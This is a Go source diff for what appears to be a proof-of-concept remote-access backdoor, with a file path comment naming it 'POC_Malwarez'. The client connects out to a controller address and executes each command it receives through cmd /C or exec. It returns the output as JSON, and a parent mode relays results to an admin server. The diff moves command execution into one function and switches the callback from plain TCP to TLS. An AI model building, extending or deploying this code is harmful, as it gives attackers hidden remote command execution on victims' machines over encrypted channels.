@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -10,6 +11,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"time"
 	// "/Blog/POC_Malwarez/arp_connect_main/ARP"
 )
 
@@ -18,11 +20,11 @@ var (
 )
 
 type Results struct {
-	Commands     bool
 	CommandsList []string
 	ID           int
 	//Command string
 	Output string
+	Time   string
 }
 
 // remove ARP
@@ -45,6 +47,57 @@ func OSCheck() string {
 
 }
 
+func getTime() string {
+	currentTime := time.Now()
+	return currentTime.Format("2006-01-02 15:04:05")
+
+}
+
+func executeCommand(checkOS string, commandString string) *Results {
+
+	var results string
+	if checkOS == "windows" {
+		// fmt.Println("WINDOWS")
+		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
+		if err != nil {
+			fmt.Println("Error executing command", err)
+			// c.Write([]byte("unable to execute command"))
+			CommandExec = []byte("Error executing command")
+			// NEED TO FIX UNABLE TO EXECUTE SENDING
+		}
+		CommandExec2 := string(CommandExec)
+		results = strings.TrimSpace(CommandExec2)
+		// fmt.Println(reflect.TypeOf(CommandExec))
+		// fmt.Println(reflect.TypeOf(err))
+
+	} else if checkOS == "linux" {
+		// fmt.Println("LINUX")
+		//fmt.Println("XS", command)
+		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
+		if err != nil {
+			fmt.Println("Error executing command", err)
+			// c.Write([]byte("unable to execute command"))
+
+		}
+		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
+		results = strings.TrimSpace(CommandExec2)
+	}
+	// fmt.Println(results2)
+	// results2 := [...]string{results, "END"}
+	//writing
+	// fmt.Fprintf(c, results2)
+
+	//using the Results structure
+	currentTime := getTime()
+	outputTest := &Results{
+		ID:     1, // TODO: need to make this random for multiple children
+		Output: results,
+		Time:   currentTime,
+	}
+	// jsonMS, _ := json.Marshal(outputTest)
+	return outputTest
+}
+
 func listMode() {
 	fmt.Println("###PRINTING TO SCREENONLY in ListMode")
 	fmt.Printf("Attempting to connect to %s \n", CONNECT)
@@ -59,7 +112,7 @@ func listMode() {
 	fmt.Println("Reading Commands list")
 
 	// if c has no connect, break
-	var results string
+
 	// need to Decode
 	var inputTest Results
 	decoder := json.NewDecoder(c)
@@ -68,56 +121,15 @@ func listMode() {
 	for _, value := range inputTest.CommandsList {
 		fmt.Println("Command Received->: " + value)
 
-		commandString := value
-		// fmt.Println("CMD received->: ", commandString.Text())
-
-		if checkOS == "windows" {
-			// fmt.Println("WINDOWS")
-			CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
-			if err != nil {
-				fmt.Println("Error executing command", err)
-				c.Write([]byte("unable to execute command"))
-				continue
-				// NEED TO FIX UNABLE TO EXECUTE SENDING
-			}
-			CommandExec2 := string(CommandExec)
-			results = strings.TrimSpace(CommandExec2)
-			// fmt.Println(reflect.TypeOf(CommandExec))
-			// fmt.Println(reflect.TypeOf(err))
-
-		} else if checkOS == "linux" {
-			// fmt.Println("LINUX")
-			//fmt.Println("XS", command)
-			CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
-			if err != nil {
-				fmt.Println("Error executing command", err)
-				c.Write([]byte("unable to execute command"))
-				continue
-			}
-			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
-			results = strings.TrimSpace(CommandExec2)
-		}
-		// fmt.Println(results2)
-		// results2 := [...]string{results, "END"}
-		//writing
-		// fmt.Fprintf(c, results2)
-
-		//using the Results structure
-		outputTest := &Results{
-			ID:     1, // TODO: need to make this random for multiple children
-			Output: results,
-		}
+		commandString := executeCommand(checkOS, value)
 
 		encoder := json.NewEncoder(c)
+		// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))
 
-		encoder.Encode(outputTest)
+		encoder.Encode(commandString)
 		// decoder := json.NewDecoder(c)
 		// decoder.Decode(&outputTest)
-		fmt.Println("Encoded format:", outputTest)
-		// results2 := jsonMS
-		// fmt.Println(jsonMS)
-		// c.Write([]byte(encoder))
-		//fmt.Fprintf(c, results2)
+		fmt.Println("Encoded format:", commandString)
 	}
 }
 
@@ -125,82 +137,37 @@ func clientMode() {
 	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
 	fmt.Printf("Attempting to connect to %s \n", CONNECT)
 
-	c, err := net.Dial("tcp", CONNECT)
+	c, err := tls.Dial("tcp", CONNECT, nil)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 	defer c.Close()
-	fmt.Println("===Connection successful==")
+	fmt.Println("===Connection Successful==")
 	fmt.Println("Listening for commands")
-
+	checkOS := OSCheck()
 	for {
 
 		// if c has no connect, break
-		var results string
-		// commandString, _ = bufio.NewReader(c).ReadString('\n')
+
 		commandString := bufio.NewScanner(c)
 		commandString.Scan()
-		// need to Decode
-		// var inputTest Results
-		// decoder := json.NewDecoder(c)
-		// decoder.Decode(&inputTest)
 
 		fmt.Println("Command Received->: " + commandString.Text())
-		if strings.TrimSpace(commandString.Text()) == "STOP" {
+		value := string(commandString.Text())
+		if strings.TrimSpace(value) == "STOP" {
 			fmt.Println("TCP client exiting...")
 			return
 		}
 		// fmt.Println("CMD received->: ", commandString.Text())
-		checkOS := OSCheck()
-		if checkOS == "windows" {
-			// fmt.Println("WINDOWS")
-			CommandExec, err := exec.Command("cmd", "/C", commandString.Text()).Output()
-			if err != nil {
-				fmt.Println("Error executing command", err)
-				c.Write([]byte("unable to execute command"))
-				continue
-				// NEED TO FIX UNABLE TO EXECUTE SENDING
-			}
-			CommandExec2 := string(CommandExec)
-			results = strings.TrimSpace(CommandExec2)
-			// fmt.Println(reflect.TypeOf(CommandExec))
-			// fmt.Println(reflect.TypeOf(err))
 
-		} else if checkOS == "linux" {
-			// fmt.Println("LINUX")
-			//fmt.Println("XS", command)
-			CommandExec, err := exec.Command(strings.TrimSpace(commandString.Text())).Output()
-			if err != nil {
-				fmt.Println("Error executing command", err)
-				c.Write([]byte("unable to execute command"))
-				continue
-			}
-			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
-			results = strings.TrimSpace(CommandExec2)
-		}
-		// fmt.Println(results2)
-		// results2 := [...]string{results, "END"}
-		//writing
-		// fmt.Fprintf(c, results2)
-
-		//using the Results structure
-		outputTest := &Results{
-			ID:     1, // TODO: need to make this random for multiple children
-			Output: results,
-		}
-		// jsonMS, _ := json.Marshal(outputTest)
+		commandresults := executeCommand(checkOS, value)
 
 		encoder := json.NewEncoder(c)
 
-		encoder.Encode(outputTest)
-		// decoder := json.NewDecoder(c)
-		// decoder.Decode(&outputTest)
-		fmt.Println("Encoded format:", outputTest)
-		// results2 := jsonMS
-		// fmt.Println(jsonMS)
-		// c.Write([]byte(encoder))
-		//fmt.Fprintf(c, results2)
+		encoder.Encode(commandresults)
+
+		fmt.Println("Encoded format:", commandresults)
 
 	}
 
@@ -239,10 +206,6 @@ func parentMode() {
 	} else {
 		fmt.Println("CHILD connected on", PORT)
 	}
-	// fmt.Println("server establed on", PORT)
-
-	//server connection for child to connect to.
-	//connection on port 10000
 
 	for {
 
@@ -270,9 +233,6 @@ func parentMode() {
 			fmt.Println("Error reading:", err.Error())
 			break
 		}
-
-		// s := string(buf[:len])
-
 		// writing to ADMIN server
 		c.Write([]byte(buf[:len]))
 
